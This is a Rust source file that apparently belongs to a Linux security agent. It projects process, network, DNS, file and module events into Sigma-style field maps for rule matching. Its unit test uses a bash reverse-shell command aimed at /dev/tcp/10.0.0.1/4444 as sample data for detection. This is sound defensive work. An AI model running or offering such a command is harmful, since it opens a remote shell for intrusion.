//! Project an [`AgentEvent`] into a Sigma-style flat field map.
//!
//! Each event variant maps onto a Sigma `logsource.category` and a set of
//! Sigma-standard field names (lower-cased for case-insensitive lookup). Only
//! the categories that carry security-relevant Sigma rules are modelled; an
//! unsupported event yields `None` and is simply skipped by the engine.

use std::collections::HashMap;

use crate::schema::{AgentEvent, EventData};

const EMPTY: &[String] = &[];

/// A read-only field projection of a single event.
pub struct FieldView {
    pub category: &'static str,
    pub product: &'static str,
    fields: HashMap<String, Vec<String>>,
    full_text: String,
}

impl FieldView {
    /// Values for a (lower-cased) Sigma field name, or an empty slice.
    pub fn get(&self, field: &str) -> &[String] {
        self.fields
            .get(field)
            .map(|v| v.as_slice())
            .unwrap_or(EMPTY)
    }

    /// Concatenation of the salient fields, for keyword (`Search::Keywords`)
    /// matching.
    pub fn full_text(&self) -> &str {
        &self.full_text
    }

    /// Build a projection for `event`, or `None` if the event type carries no
    /// Sigma mapping.
    pub fn from_event(event: &AgentEvent) -> Option<FieldView> {
        let mut f: HashMap<String, Vec<String>> = HashMap::new();
        let mut put = |k: &str, v: String| {
            if !v.is_empty() {
                f.entry(k.to_string()).or_default().push(v);
            }
        };

        let (category, full_text): (&'static str, String) = match &event.data {
            EventData::ProcessExec(e) => {
                put("image", e.exe.clone());
                put("commandline", e.cmdline.clone());
                put("comm", e.comm.clone());
                put("user", e.username.clone());
                put("currentdirectory", e.cwd.clone());
                put("processid", e.pid.to_string());
                put("parentprocessid", e.ppid.to_string());
                if let Some(h) = &e.exe_sha256 {
                    put("sha256", h.clone());
                    put("hashes", h.clone());
                }
                if let Some(p) = &e.ld_preload {
                    put("ld_preload", p.clone());
                }
                if let Some(img) = &e.container_image {
                    put("containerimage", img.clone());
                }
                ("process_creation", format!("{} {}", e.exe, e.cmdline))
            }
            EventData::NetworkConnection(e) => {
                put("destinationip", e.dst_addr.clone());
                put("destinationport", e.dst_port.to_string());
                put("sourceip", e.src_addr.clone());
                put("sourceport", e.src_port.to_string());
                put("protocol", e.protocol.clone());
                if let Some(p) = &e.process {
                    put("image", p.clone());
                }
                if let Some(pid) = e.pid {
                    put("processid", pid.to_string());
                }
                let proc = e.process.clone().unwrap_or_default();
                ("network_connection", format!("{} {}", e.dst_addr, proc))
            }
            EventData::DnsResolution(e) => {
                put("query", e.qname.clone());
                put("queryname", e.qname.clone());
                put("record_type", e.qtype.clone());
                for ip in &e.resolved_ips {
                    put("answer", ip.clone());
                }
                ("dns_query", e.qname.clone())
            }
            EventData::FileOpen(e) => {
                put("targetfilename", e.path.clone());
                put("filename", e.path.clone());
                put("image", e.comm.clone());
                put("user", e.username.clone());
                put("processid", e.pid.to_string());
                ("file_event", e.path.clone())
            }
            EventData::Filesystem(e) => {
                put("targetfilename", e.path.clone());
                put("filename", e.path.clone());
                put(
                    "fileoperation",
                    format!("{:?}", e.operation).to_ascii_lowercase(),
                );
                put(
                    "integrity",
                    format!("{:?}", e.integrity).to_ascii_lowercase(),
                );
                ("file_event", e.path.clone())
            }
            EventData::ModuleLoad(e) => {
                put("imageloaded", e.name.clone());
                put("drivername", e.name.clone());
                put("user", e.username.clone());
                ("driver_load", e.name.clone())
            }
            EventData::Setuid(e) => {
                put("comm", e.comm.clone());
                put("image", e.comm.clone());
                put("user", e.new_uid.to_string());
                put("processid", e.pid.to_string());
                ("process_creation", e.comm.clone())
            }
            _ => return None,
        };

        Some(FieldView {
            category,
            product: "linux",
            fields: f,
            full_text,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::schema::{AgentEvent, EventAction, EventClass, EventData, ExecEventData, Severity};

    fn exec_event(exe: &str, cmd: &str) -> AgentEvent {
        let data = ExecEventData {
            pid: 100,
            ppid: 1,
            uid: 0,
            gid: 0,
            username: "root".into(),
            comm: "bash".into(),
            exe: exe.into(),
            cmdline: cmd.into(),
            cwd: "/root".into(),
            container_id: None,
            ld_preload: None,
            exe_sha256: Some("abc123".into()),
            loaded_libraries: vec![],
            env: Default::default(),
            interpreter: None,
            container_runtime: None,
            container_image: None,
            container_image_digest: None,
            k8s: None,
            ..Default::default()
        };
        AgentEvent::new(
            "agent".into(),
            "host".into(),
            EventClass::Process,
            EventAction::Exec,
            Severity::Info,
            EventData::ProcessExec(Box::new(data)),
        )
    }

    #[test]
    fn process_exec_projects_standard_fields() {
        let ev = exec_event("/usr/bin/bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        let v = FieldView::from_event(&ev).unwrap();
        assert_eq!(v.category, "process_creation");
        assert_eq!(v.get("image"), &["/usr/bin/bash".to_string()]);
        assert_eq!(v.get("sha256"), &["abc123".to_string()]);
        assert!(v.full_text().contains("/dev/tcp/"));
        assert!(v.get("nonexistent").is_empty());
    }
}
